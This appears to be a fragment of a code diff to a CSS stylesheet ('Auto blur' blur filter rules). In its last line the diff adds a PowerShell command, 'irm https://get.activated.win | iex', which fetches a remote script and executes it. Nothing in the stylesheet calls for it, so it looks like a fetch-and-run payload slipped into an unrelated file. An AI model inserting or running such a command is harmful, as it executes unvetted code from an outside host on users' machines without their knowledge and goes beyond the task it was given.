@@ -112,5 +112,5 @@ Auto blur
        filter: blur(0px);
 }
 }
-
+irm https://get.activated.win | iex 
 
